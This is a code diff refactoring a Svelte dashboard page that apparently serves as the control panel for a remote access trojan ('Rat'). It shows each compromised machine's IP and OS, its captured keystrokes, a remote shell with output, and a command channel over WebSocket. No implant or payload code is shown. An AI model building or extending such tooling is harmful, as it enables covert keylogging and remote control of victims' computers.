@@ -3,16 +3,17 @@
 	import { onMount } from 'svelte';
 	import type { Seeker } from '$lib/types';
 	import { writable } from 'svelte/store';
+	import ShellComponent from '$lib/components/ShellComponent.svelte';
+	import KeyloggerComponent from '$lib/components/KeyloggerComponent.svelte';
+	import InfoComponent from '$lib/components/InfoComponent.svelte';
+	import MessageComponent from '$lib/components/MessageComponent.svelte';
 
 	let seeker: Seeker | null = null;
 	let ws: WebSocket | null = null;
-	let messageType = '';
-	let messageData = '';
 	const connected = writable(false);
 	const keylogs = writable<string[]>([]);
-	let displayLimit = writable('100');
-
-	const limitOptions = ['10', '50', '100', 'all'];
+	const shellOutput = writable<string[]>([]);
+	const shellRunning = writable(false);
 
 	function decodeHtml(html: string): string {
 		const txt = document.createElement('textarea');
@@ -53,8 +54,6 @@
 		keylogs.set(parseKeylogs(decoded));
 	}
 
-	$: displayedKeylogs = $displayLimit === 'all' ? $keylogs : $keylogs.slice(-parseInt($displayLimit));
-
 	async function setSeeker(id: string) {
 		const res = await fetch(`/api/seekers`);
 		if (!res.ok) {
@@ -63,22 +62,8 @@
 		}
 		const seekers: Record<string, Seeker> = await res.json();
 		seeker = seekers[id] ?? null;
-
-        displayedKeylogs = [seeker.keylogs];
-        
+        console.log(seeker);
 		connected.set(!seeker?.disconnected);
-	}
-
-	function sendMessage() {
-		if (ws?.readyState === WebSocket.OPEN) {
-			const message = {
-				type: messageType,
-				data: messageData
-			};
-			ws.send(JSON.stringify(message));
-		} else {
-			console.warn('WebSocket not connected.');
-		}
 	}
 
 	onMount(() => {
@@ -86,9 +71,6 @@
 		setSeeker(id);
 
 		ws = new WebSocket(`ws://localhost:8080/ws/frontend/${id}`);
-
-		ws.onopen = () => connected.set(true);
-		ws.onclose = () => connected.set(false);
 
 		ws.onmessage = async (event) => {
 			console.log('Message from server:', event.data);
@@ -122,6 +104,9 @@
 							keylogs.set(parseKeylogs(seeker.keylogs));
 						}
 						break;
+					case 'shell_output':
+						shellOutput.update((arr) => [...arr, message.data as string]);
+						break;
 					default:
 						console.warn('Unknown message type:', message.type);
 				}
@@ -134,89 +119,23 @@
 			ws?.close();
 		};
 	});
+
+	function sendMessage(type: string, data: string) {
+		if (ws?.readyState === WebSocket.OPEN) {
+			const message = { type, data };
+			ws.send(JSON.stringify(message));
+		} else {
+			console.warn('WebSocket not connected.');
+		}
+	}
 </script>
 
 {#if seeker}
 	<div class="p-6 bg-gray-800 rounded shadow-lg space-y-6">
-		<h2 class="text-3xl font-semibold text-white">{seeker.name}</h2>
-		<div class="text-gray-300">
-			<p><strong>ID:</strong> {seeker.id}</p>
-			<p><strong>OS:</strong> {seeker.os}</p>
-			<p><strong>IP:</strong> {seeker.ip}</p>
-		</div>
-		<div class="mt-4">
-			<a
-				href="/{seeker.id}/shell"
-				class="inline-block px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-500 transition"
-			>
-				Open Shell
-			</a>
-		</div>
-		<h3 class="text-xl text-white">Metadata</h3>
-		<pre
-			class="bg-gray-900 text-sm text-gray-200 p-4 rounded overflow-auto max-h-64">{JSON.stringify(
-				seeker.metadata,
-				null,
-				2
-			)}</pre>
-
-		<div class="mt-6 p-4 bg-gray-700 rounded space-y-4">
-			<div class="flex justify-between items-center">
-				<h4 class="text-lg font-medium text-white">Keystrokes</h4>
-				<div class="flex items-center gap-2">
-					<label for="keylog-limit" class="text-sm text-gray-300">Show last:</label>
-					<select
-						id="keylog-limit"
-						bind:value={$displayLimit}
-						class="bg-gray-800 text-white border border-gray-600 rounded px-2 py-1 focus:outline-none focus:ring focus:border-blue-400"
-					>
-						{#each limitOptions as option}
-							<option value={option}>{option === 'all' ? 'All' : option}</option>
-						{/each}
-					</select>
-				</div>
-			</div>
-			<div class="bg-gray-900 p-4 rounded max-h-64 overflow-y-auto">
-				{#if displayedKeylogs.length > 0}
-					<div class="flex flex-wrap gap-2">
-						{#each displayedKeylogs as key}
-							<span
-								class="inline-block px-2 py-1 bg-blue-600 text-white text-sm rounded"
-							>
-								{key}
-							</span>
-						{/each}
-					</div>
-				{:else}
-					<p class="text-gray-400 text-sm">No keystrokes recorded.</p>
-				{/if}
-			</div>
-		</div>
-
-		<div class="mt-6 p-4 bg-gray-700 rounded space-y-2">
-			<h4 class="text-lg font-medium text-white">Send WebSocket Message</h4>
-			<div class="flex flex-col gap-2">
-				<input
-					bind:value={messageType}
-					type="text"
-					placeholder="Type"
-					class="px-3 py-2 rounded bg-gray-800 text-white border border-gray-600 focus:outline-none focus:ring focus:border-blue-400"
-				/>
-				<input
-					bind:value={messageData}
-					type="text"
-					placeholder="Data"
-					class="px-3 py-2 rounded bg-gray-800 text-white border border-gray-600 focus:outline-none focus:ring focus:border-blue-400"
-				/>
-				<button
-					on:click={sendMessage}
-					class="bg-green-600 hover:bg-green-500 text-white px-4 py-2 rounded transition"
-				>
-					Send Message
-				</button>
-			</div>
-			<p class="text-sm text-gray-400 mt-2">Status: {$connected ? 'Connected' : 'Disconnected'}</p>
-		</div>
+		<InfoComponent {seeker} {connected}/>
+		<ShellComponent {sendMessage} {shellRunning} {shellOutput} />
+		<KeyloggerComponent {keylogs} />
+		<MessageComponent {sendMessage} />
 	</div>
 {:else}
 	<p class="text-gray-300">Rat not found.</p>
